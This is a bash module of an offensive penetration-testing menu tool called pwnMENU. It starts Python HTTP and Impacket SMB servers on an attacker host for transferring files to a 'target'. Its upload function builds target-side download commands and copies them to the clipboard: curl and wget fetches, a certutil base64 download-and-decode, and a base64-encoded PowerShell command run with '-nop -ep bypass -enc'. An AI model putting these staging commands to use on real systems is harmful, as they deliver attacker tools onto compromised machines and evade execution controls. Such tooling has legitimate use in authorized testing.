#!/bin/bash
####################### #### ## #  #
# >> pwnMENU - tools
################### #### ## #  #    #
#
# >> this file contains the tools and their functions...

if [ -f "$home_dir/.httpd.pid" ]; then
    httpd_details="$(cat "$home_dir/.httpd.pid")"
    httpd_ip="$(echo "$httpd_details" | awk '{print $2}')"
    httpd_port=$(echo "$httpd_details" | awk '{print $3}')
    httpd_url=$(echo "$httpd_details" | awk '{print $4}')
    httpd_path=$(echo "$httpd_details" | awk '{print $5}')
    httpd_status="online"
else
    if [ "$httpd_bind_ip" != "" ]; then
        old_def_ip="$def_ip"
        old_ip="$ip"
        def_ip="$httpd_bind_ip"
        ip=""
        get_ips -h
        httpd_ip="$ip"
        def_ip="$old_def_ip"
        ip="$old_ip"
    else
        httpd_ip=""
    fi
    if [ $httpd_def_port -ne 0 ]; then
        httpd_port=$httpd_def_port
    else
        httpd_port=0
    fi
    if [ "$httpd_root_dir" != "" ]; then
        httpd_path="$httpd_root_dir"
    else
        httpd_path=""
    fi
    httpd_url=""
    httpd_status="offline"
fi

if [ -f "$home_dir/.smbd.pid" ]; then
    smbd_details="$(cat "$home_dir/.smbd.pid")"
    smbd_ip="$(echo "$smbd_details" | awk '{print $2}')"
    smbd_port=$(echo "$smbd_details" | awk '{print $3}')
    smbd_share="$(echo "$smbd_details" | awk '{print $4}')"
    smbd_rempath="$(echo "$smbd_details" | awk '{print $5}')"
    smbd_path="$(echo "$smbd_details" | awk '{print $6}')"
    smbd_status="online"
else
    if [ "$smbd_bind_ip" != "" ]; then
        old_def_ip="$def_ip"
        old_ip="$ip"
        def_ip="$smbd_bind_ip"
        ip=""
        get_ips -h
        smbd_ip="$ip"
        def_ip="$old_def_ip"
        ip="$old_ip"
    else
        smbd_ip=""
    fi
    if [ "$smbd_root_dir" != "" ]; then
        smbd_path="$smbd_root_dir"
    else
        smbd_path=""
    fi
    if [ "$smbd_def_share" != "" ]; then
        smbd_share="$smbd_def_share"
    else
        smbd_share=""
    fi
    smbd_port=445
    smbd_rempath=""
    smbd_status="offline"
fi

menu_tools()
{
	menu="$(pfx -n "HTTPD") python httpd server (status = $httpd_status)\n<small>a simple HTTP server for uploading tools to the target</small>$lb$(pfx -n "SMBD") SMBD server (status = $smbd_status)\n<small>a simple SMBD server for transferring data to and from the target</small>$lb$lbrk$lb$(pfx -n "UPLOAD") upload recon / pivoting tools to the target via HTTPD\n<small>select binaries from the HTTPD server to upload to the target</small>$lb$lbrk$lb$(pfx -n "BACK") go back ..."
	msg="pwnMENU > <b>TOOLS</b>\n<small>select from the following options:</small>"
	result=$(echo -ne "$menu" | rf "TOOLS" "$msg" 11)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"HTTPD")
			tool_httpd
			;;
		"SMBD")
			tool_smbd
			;;
		"UPLOAD")
			tool_upload
			;;
		"BACK")
			main
			;;
    esac
}

tool_httpd()
{
	options="$(pfx -n "PATH") $httpd_path\n<small>the local path for the HTTPD root</small>$lb$(pfx -n "IP") $httpd_ip\n<small>IP address used to allow the target to connect</small>$lb$(pfx -n "PORT") $httpd_port\n<small>port the HTTP server listens on</small>$lb$lbrk$lb$(pfx -n "URL") $httpd_url\n<small>(status = $httpd_status) - the URL to the HTTPD server (clipboard)</small>$lb$(pfx -n "START") start HTTPD server\n<small>starts the HTTPD server</small>$lb$(pfx -n "STOP") stop HTTPD server\n<small>stops the currently running HTTPD server</small>$lb$(pfx -n "BACK") go back...\n"
	msg="pwnMENU > <b>HTTPD</b>\n<small>spawn an instance of a python 3 simplehttpserver</small>"
	result=$(echo -ne "$options" | rf "HTTPD" "$msg" 8)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"PATH")
			httpd_path
			;;
		"IP")
            old_ip=$ip
			set_ip -h
			httpd_ip=$ip
			ip=$old_ip
			tool_httpd
			;;
		"PORT")
            msg="pwnMENU > TOOLS > HTTPD <b>PORT</b>\n<small>enter port to listen on (default = $httpd_def_port)</small>"
            hport=$(echo '' | rf "PORT" "$msg" 0)
            httpd_port="$hport"
            tool_httpd
			;;
		"URL")
            if [ $httpd_status != "offline" ]; then
                echo -ne $httpd_url | xclip -sel clip
                rf_msg "$(pfx -n "INFO") HTTPD URL copied to the clipboard."
                exit 0
            else
                rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
            fi
			tool_httpd
			;;
		"START")
            if [ "$httpd_status" != "online" ]; then
                httpd_status="online"
                if [ $httpd_port -ne 80 ]; then
                    httpd_url="http://$httpd_ip:$httpd_port"
                else
                    httpd_url="http://$httpd_ip"
                fi
                if [ $httpd_port -gt 1024 ]; then
                    python3 -m http.server --directory $httpd_path --bind $httpd_ip $httpd_port &
                    echo "$! $httpd_ip $httpd_port $httpd_url $httpd_path" > $home_dir/.httpd.pid
                elif [ $httpd_port -lt 1024 ]; then
                    msg="pwnMENU > TOOLS > HTTPD > START > <b>SUDO</b>\n<small>because the port is below 1024 you will need to provide your sudo password...\n\n<b>NOTE:</b> this password will not be stored anywhere!</small>"
                    pass="$(echo -ne '' | rf "SUDO" "$msg" 0 )"
                    echo $pass | sudo -S -k python3 -m http.server --directory $httpd_path --bind $httpd_ip $httpd_port &
                    unset pass
                    sleep 5
                    pid=$(ps aux | grep 'python3 -m http.server' | grep -v -e "sudo" -e "grep" | awk '{print $2}')
                    echo "$pid $httpd_ip $httpd_port $httpd_url $httpd_path" > $home_dir/.httpd.pid
                fi
                rf_msg "$(pfx -n "INFO") HTTPD server started - URL = '$httpd_url'."
            else
                rf_msg "$(pfx -n "ERROR") the HTTPD server is currently running."
            fi
			tool_httpd
			;;
		"STOP")
            if [ "$httpd_status" == "online" ]; then
                pid=$(cat $home_dir/.httpd.pid | awk '{print $1}')
                pusr="$(ps aux | grep $pid | grep -v "grep" | awk '{print $1}')"
                if [ "$pusr" != "$(whoami)" ] && [ "$pusr" == "root" ]; then
                    msg="pwnMENU > TOOLS > HTTPD > START > <b>SUDO</b>\n<small>because this instance was started as 'root' we need your sudo password to stop the service...\n\n<b>NOTE:</b> this password will not be stored anywhere!</small>"
                    pass="$(echo -ne '' | rf "SUDO" "$msg" 0 )"
                    echo $pass | sudo -S -k kill -9 $pid
                    unset pass
                else
                    kill -9 $pid
                fi
                rm $home_dir/.httpd.pid
                httpd_status="offline"
                httpd_url=""
                rf_msg "$(pfx -n "INFO") HTTPD server has been shut down."
            else
                rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
            fi
            tool_httpd
			;;
        "BACK")
            main
            ;;
        "$lbrk")
            tool_httpd
            ;;
	esac
}

httpd_path()
{
    if [ "$curr_dir" == "" ]; then
        curr_dir="$HOME"
    fi
    folders=$(echo -e "$(pfx -n "SAVE") $curr_dir\n$(pfx -n "BACK") $curr_dir\n$lbrk"; ls -1d $curr_dir/*/ | sed "s|$curr_dir/||g" | cut -f1 -d '/')
	result=$(echo -ne "$folders" | rf "HTTPPATH")
    result=$(echo $result | awk '{print $1}')
	case $result in
		"SAVE")
            httpd_path=$curr_dir
            rf_msg "$(pfx -n "INFO") httpd path set to '$httpd_path'."
            tool_httpd
            ;;
        "BACK")
            curr_dir=$(dirname $curr_dir)
            httpd_path
            ;;
        "$lbrk")
            httpd_path
            ;;
        *)
            if [ "$result" != "" ]; then
                if [ "$curr_dir" == "/" ]; then
                    curr_dir="/$result"
                else
                    curr_dir="$curr_dir/$result"
                fi
                httpd_path
            else
                tool_httpd
            fi
            ;;
    esac
}

tool_smbd()
{
	options="$(pfx -n "PATH") $smbd_path\n<small>the local path for the SMBD root</small>$lb$(pfx -n "IP") $smbd_ip\n<small>IP address to bind to</small>$lb$(pfx -n "SHARE") $smbd_share\n<small>name of the share the SMBD server will provide</small>$lb$(pfx -n "PORT") $smbd_port\n<small>(optional) port the SMBD server listens on (default = 445)</small>$lb$(pfx -n "SMB2") $smbd_smb2\n<small>(optional) enables SMB2 support (experimental!)</small>$lb$lbrk$lb$(pfx -n "REMPATH") $smbd_rempath\n<small>(status = $smbd_status) copies the SMBD path in Windows format to the clipboard</small>$lb$(pfx -n "START") start SMBD server\n<small>starts the SMBD server</small>$lb$(pfx -n "STOP") stop SMBD server\n<small>stops the currently running SMBD server</small>$lb$(pfx -n "BACK") go back..."
	msg="pwnMENU > <b>SMBD</b>\n<small>spawn an Impacket smbserver.py instance to share files over SMB</small>"
	result=$(echo -ne "$options" | rf "SMBD" "$msg" 10)
    result=$(echo $result | awk '{print $1}')
	case $result in
		"PATH")
			smbd_path
			;;
		"IP")
            old_ip=$ip
			set_ip -h
			smbd_ip=$ip
			ip=$old_ip
			tool_smbd
			;;
        "SMB2")
            msg="pwnMENU > TOOLS > SMBD <b>SMB2</b>\n<small>(optional) enable or disable SMB2 support (experimental!) (default = disabled)</small>"
            menu="$(pfx "N/A") disable SMB2 support$lb$(pfx "-smb2support") enable SMB2 support"
            result=$(echo -e "$menu" | rf "SMB2" "$msg" 2)
            result=$(echo $result | awk '{print $1}')
            case $result in
                "N/A")
                    smbd_smb2=""
                    tool_smbd
                    ;;
                "-smb2support")
                    smbd_smb2="-smb2support"
                    tool_smbd
                    ;;
            esac
            ;;
        "PORT")
            msg="pwnMENU > TOOLS > SMBD <b>PORT</b>\n<small>(optional) enter port to listen on (default = 445)</small>"
            sport=$(echo '' | rf "PORT" "$msg" 0)
            smbd_port=$sport
            tool_smbd
			;;
		"REMPATH")
            if [ $smbd_status != "offline" ]; then
                if [ "$target_os" == "windows" ]; then
                    echo -n $(echo $smbd_rempath | sed 's|//|\\\\|g; s|/|\\|g') | xclip -sel clip
                elif [ "$target_os" == "linux" ]; then
                    echo -ne $smbd_rempath | xclip -sel clip
                fi
                rf_msg "$(pfx -n "INFO") SMBD remote path copied to the clipboard."
                exit 0
            else
                rf_msg "$(pfx -n "ERROR") the SMBD server is not currently running."
            fi
			tool_smbd
			;;
		"START")
            if [ "$smbd_status" != "online" ]; then
                smbd_status="online"
                smbd_rempath="//$smbd_ip/$smbd_share"
                if [ $smbd_port -ne 445 ]; then
                    smbd_rempath="//$smbd_ip:$smbd_port/$smbd_share"
                    if [ "$smbd_options" == "" ]; then
                        smbd_options="-port $smbd_port"
                    else
                        smbd_options="$smbd_options -port $smbd_port"
                    fi
                else
                    smbd_rempath="//$smbd_ip/$smbd_share"
                fi
                if [ "$smbd_smb2" != "" ]; then
                    if [ "$smbd_options" == "" ]; then
                        smbd_options="$smbd_smb2"
                    else
                        smbd_options="$smbd_options $smbd_smb2"
                    fi
                fi
                if [ $smbd_port -lt 1024 ]; then
                    msg="pwnMENU > TOOLS > SMBD > START > <b>SUDO</b>\n<small>because the port is below 1024 you will need to provide your sudo password...\n\n<b>NOTE:</b> this password will not be stored anywhere!</small>"
                    pass="$(echo -ne '' | rf "SUDO" "$msg" 0 )"
                    echo $pass | sudo -S -k smbserver.py -ip $smbd_ip $smbd_options $smbd_share $smbd_path &
                    unset pass
                    sleep 10
                    pid=$(ps aux | grep -e "python3" -e "smbserver" | grep -v -e "sudo" -e "grep" | awk '{print $2}')
                    echo "$pid $smbd_ip $smbd_port $smbd_share $smbd_rempath $smbd_path" > $home_dir/.smbd.pid
                elif [ $smbd_port -gt 1024 ]; then
                    smbserver.py -ip $smbd_ip $smbd_options $smbd_share $smbd_path &
                    echo "$! $smbd_ip $smbd_port $smbd_share $smbd_rempath $smbd_path" > $home_dir/.smbd.pid
                fi
                rf_msg "$(pfx -n "INFO") SMBD server started - REMPATH = '$smbd_rempath'."
            else
                rf_msg "$(pfx -n "ERROR") the SMBD server is currently running."
            fi
			tool_smbd
			;;
		"STOP")
            if [ "$smbd_status" == "online" ]; then
                pid=$(cat $home_dir/.smbd.pid | awk '{print $1}')
                pusr="$(ps aux | grep $pid | grep -v "grep" | awk '{print $1}')"
                if [ "$pusr" != "$(whoami)" ] && [ "$pusr" == "root" ]; then
                    msg="pwnMENU > TOOLS > SMBD > START > <b>SUDO</b>\n<small>because this instance was started as 'root' we need your sudo password to stop the service...\n\n<b>NOTE:</b> this password will not be stored anywhere!</small>"
                    pass="$(echo -ne '' | rf "SUDO" "$msg" 0 )"
                    echo $pass | sudo -S -k kill -9 $pid
                    unset pass
                else
                    kill -9 $pid
                fi
                rm $home_dir/.smbd.pid
                smbd_status="offline"
                smbd_rempath=""
                rf_msg "$(pfx -n "INFO") SMBD server has been shut down."
            else
                rf_msg "$(pfx -n "ERROR") the SMBD server is not currently running."
            fi
            tool_smbd
			;;
        "BACK")
            main
            ;;
        "$lbrk")
            tool_smbd
            ;;
	esac
}

smbd_path()
{
    if [ "$curr_dir" == "" ]; then
        curr_dir="$HOME"
    fi
    folders=$(echo -e "$(pfx -n "SAVE") $curr_dir\n$(pfx -n "BACK") $curr_dir\n$lbrk"; ls -1d $curr_dir/*/ | sed "s|$curr_dir/||g" | cut -f1 -d '/')
	result=$(echo -ne "$folders" | rf "SMBDPATH")
    result=$(echo $result | awk '{print $1}')
	case $result in
		"SAVE")
            smbd_path=$curr_dir
            rf_msg "$(pfx -n "INFO") SMBD path set to '$smbd_path'."
            tool_smbd
            ;;
        "BACK")
            curr_dir=$(dirname $curr_dir)
            smbd_path
            ;;
        "$lbrk")
            smbd_path
            ;;
        *)
            if [ "$result" != "" ]; then
                if [ "$curr_dir" == "/" ]; then
                    curr_dir="/$result"
                else
                    curr_dir="$curr_dir/$result"
                fi
                smbd_path
            else
                tool_smbd
            fi
            ;;
    esac
}

tool_upload()
{
    if [ "$httpd_status" == "online" ]; then
        msg="pwnMENU > TOOL > <b>UPLOAD</b>\n<small>select the download method to be used on the target system:\n\n<b>NOTE:</b> unlike the PRIVESC download methods, these will not run the file (just download it)</small>"
        if [ "$target_os" = "linux" ]; then
            dl_methods="curl${lb}wget"
            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
        elif [ "$target_os" = "windows" ]; then
            dl_methods="certutil${lb}powershell"
            dl_method=$(echo -ne "$dl_methods" | rf "DOWNLOAD" "$msg" 2)
        fi
        filelist=$(ls -1p $httpd_path/tools | grep -v '.tar.gz' | sed 's/_x86.exe//g; s/_x64.exe//g; s/_x64//g; s/_x86//g;' | uniq)
        files=$(echo -e "$(pfx -n "BACK") go back...\n$lbrk\n$filelist" )
        result=$(echo -ne "$files" | rf "UPLOAD")
        result=$(echo $result | awk '{print $1}')
        case $result in
            "BACK")
                menu_tools
                ;;
            "$lbrk")
                menu_tools
                ;;
            *)
                filename="$result"
                if [ "$target_os" == "linux" ] && [ "$target_arch" == "x64" ]; then     fileext="_x64";
                elif [ "$target_os" == "linux" ] && [ "$target_arch" == "x86" ]; then   fileext="_x86";
                elif [ "$target_os" == "windows" ] && [ "$target_arch" == "x64" ]; then   fileext="_x64.exe";
                elif [ "$target_os" == "windows" ] && [ "$target_arch" == "x86" ]; then   fileext="_x86";
                fi
                if [ -f "$httpd_path/tools/$filename$fileext" ]; then
                    dl_filename="$filename$fileext"
                else
                    if [ "$target_os" == "windows" ] && [ -f "$http_path/tools/$filename.exe" ]; then
                        dl_filename="$filename.exe"
                    elif [ "$target_os" == "linux" ] && [ -f "$http_path/tools/$filename" ]; then
                        dl_filename="$filename"
                    elif [ "$target_os" == "windows" ] && [ ! -f "$http_path/tools/$filename.exe" ]; then
                        rf_msg "$(pfx -n "ERROR") there is no version for the target arch of '$filename' available."
                        menu_tools
                        break
                    elif [ "$target_os" == "linux" ] && [ ! -f "$http_path/tools/$filename" ]; then
                        rf_msg "$(pfx -n "ERROR") there is no version for the target arch of '$filename' available."
                        menu_tools
                        break
                    fi
                fi
                if [ "$target_os" == "windows" ]; then
                    filename="$filename.exe"
                fi
                if [ "$target_os" = "linux" ]; then
                    if [ "$dl_method" == "curl" ]; then
                        payload="curl -o $filename $httpd_url/tools/$dl_filename"
                    elif [ "$dl_method" == "wget" ]; then
                        payload="wget -o $filename $httpd_url/tools/$dl_filename"
                    fi
                elif [ "$target_os" = "windows" ]; then
                    if [ "$dl_method" == "certutil" ]; then
                        rm $httpd_path/payload.b64
                        base64 -w 0 $httpd_path/tools/$dl_filename > $httpd_path/payload.b64
                        payload="certutil -urlcache -split -f $httpd_url/payload.b64 payload.b64 & certutil -decode payload.b64 $filename"
                    elif [ "$dl_method" == "powershell" ]; then
                        initial=$(echo -n "IWR $httpd_url/tools/$dl_filename -UseBasicParsing -outfile $filename" | iconv -t UTF-16LE | base64 -w 0)
                        payload="powershell -nop -ep bypass -enc $initial"
                        payload="$payload"
                    fi
                fi
                if [ "$payload" != "" ]; then
                    echo -ne $payload | xclip -sel clip
                    rf_msg "$(pfx -n "INFO") tool download command copied to the clipboard."
                    exit 0
                fi
                ;;
            esac
    else
        rf_msg "$(pfx -n "ERROR") the HTTPD server is not currently running."
    fi
}
